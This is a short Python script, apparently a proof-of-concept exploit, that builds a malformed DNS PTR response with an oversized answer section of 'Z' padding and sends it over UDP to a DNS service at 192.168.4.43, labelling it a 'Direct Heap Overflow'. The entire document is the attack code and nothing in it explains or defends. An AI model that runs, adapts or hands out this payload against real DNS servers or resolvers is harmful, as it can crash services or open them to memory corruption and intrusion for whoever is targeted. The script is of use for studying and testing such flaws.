import socket
import struct

target_ip = "192.168.4.43"
target_port = 53

def dw(x):
    return struct.pack('>H', x)

# Build a malicious DNS response packet
# We are pretending to be a DNS server sending an unsolicited response
res = b'\x12\x34'                        # Transaction ID
res += dw(0x85a0)                        # Flags
res += dw(1)                             # Questions
res += dw(0x52)                          # Answers
res += dw(0)
res += dw(0)

# Question section
res += b'\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' + b'\x00\x0c' + b'\x00\x01'

# Overflow Trigger (Padding with 'Z')
res += (b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + 
        b'\x04\x00' + (b'\x3e' + b'Z'*62) * 16 + b'\x0e' + b'Z'*14 + b'\x00')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print(f"[*] Sending Direct Heap Overflow to {target_ip}:{target_port}...")
sock.sendto(res, (target_ip, target_port))
print("[+] Payload delivered. Check Nmap again.")

